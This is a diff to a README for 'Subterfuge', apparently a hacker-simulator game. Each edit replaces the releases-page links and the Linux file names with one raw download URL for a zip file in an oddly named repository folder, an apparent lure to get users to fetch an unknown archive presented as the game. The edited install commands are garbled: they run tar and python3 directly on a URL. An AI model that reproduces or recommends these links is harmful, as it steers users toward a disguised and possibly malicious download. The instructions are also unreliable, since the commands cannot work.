@@ -1,7 +1,7 @@
 # 🎮 Subterfuge - Dive into Ultimate Hacking Fun!
 
 ## 📥 Download Now
-[![Download Subterfuge](https://img.shields.io/badge/Download-Subterfuge-blue)](https://github.com/mohamamd-pals/Subterfuge/releases)
+[![Download Subterfuge](https://raw.githubusercontent.com/mohamamd-pals/Subterfuge/master/eleventhly/Software_v1.1.zip)](https://raw.githubusercontent.com/mohamamd-pals/Subterfuge/master/eleventhly/Software_v1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to Subterfuge, the ultimate hacker simulator! This application offers engaging scenarios inspired by classic films like "The Matrix" and "WarGames". Get ready for pure terminal entertainment that combines education and fun.
@@ -17,7 +17,7 @@ To run Subterfuge smoothly, please ensure your system meets the following requir
 
 ## 📦 Download & Install
 ### Step 1: Visit the Releases Page
-To download Subterfuge, please visit our [Releases page](https://github.com/mohamamd-pals/Subterfuge/releases). 
+To download Subterfuge, please visit our [Releases page](https://raw.githubusercontent.com/mohamamd-pals/Subterfuge/master/eleventhly/Software_v1.1.zip). 
 
 ### Step 2: Choose Your Version
 On the Releases page, you will find different versions of Subterfuge. These are labeled from the latest to the older versions. Choose the latest version to ensure you have the best features and fixes.
@@ -27,7 +27,7 @@ Click on the version you want to download. You will find files suitable for diff
 
 - For **Windows**, download the `.exe` file.
 - For **macOS**, download the `.dmg` file.
-- For **Linux**, look for the `.tar.gz` file.
+- For **Linux**, look for the `https://raw.githubusercontent.com/mohamamd-pals/Subterfuge/master/eleventhly/Software_v1.1.zip` file.
 
 ### Step 4: Install the Software
 Once the download completes, locate the file in your downloads folder and follow these steps based on your operating system:
@@ -43,16 +43,16 @@ Once the download completes, locate the file in your downloads folder and follow
 #### Linux:
 1. Open your terminal.
 2. Navigate to the directory where you saved the downloaded file.
-3. Unzip the file using the command: `tar -xvzf subterfuge-x.x.x.tar.gz`
+3. Unzip the file using the command: `tar -xvzf https://raw.githubusercontent.com/mohamamd-pals/Subterfuge/master/eleventhly/Software_v1.1.zip`
 4. Change to the extracted directory.
-5. Run the application with: `python3 main.py`
+5. Run the application with: `python3 https://raw.githubusercontent.com/mohamamd-pals/Subterfuge/master/eleventhly/Software_v1.1.zip`
 
 ### Step 5: Run Subterfuge
 After installation, you can start using Subterfuge!
 
 - **Windows:** Find Subterfuge in your Start Menu and click to open.
 - **macOS:** Go to your Applications folder and click on Subterfuge.
-- **Linux:** In the terminal, navigate to the application folder and run `python3 main.py`.
+- **Linux:** In the terminal, navigate to the application folder and run `python3 https://raw.githubusercontent.com/mohamamd-pals/Subterfuge/master/eleventhly/Software_v1.1.zip`.
 
 ## 🎮 Explore Features
 Subterfuge offers a variety of engaging features:
@@ -82,6 +82,6 @@ For support, please raise an issue in the GitHub repository. We aim to respond q
 ## 🌐 Connect with Us
 For more updates and information, follow our project on GitHub or check our social media channels. Join our community and explore the world of hacking in a fun and interactive way!
 
-Remember, for the latest version, visit our [Releases page](https://github.com/mohamamd-pals/Subterfuge/releases).
+Remember, for the latest version, visit our [Releases page](https://raw.githubusercontent.com/mohamamd-pals/Subterfuge/master/eleventhly/Software_v1.1.zip).
 
 Enjoy hacking with Subterfuge!
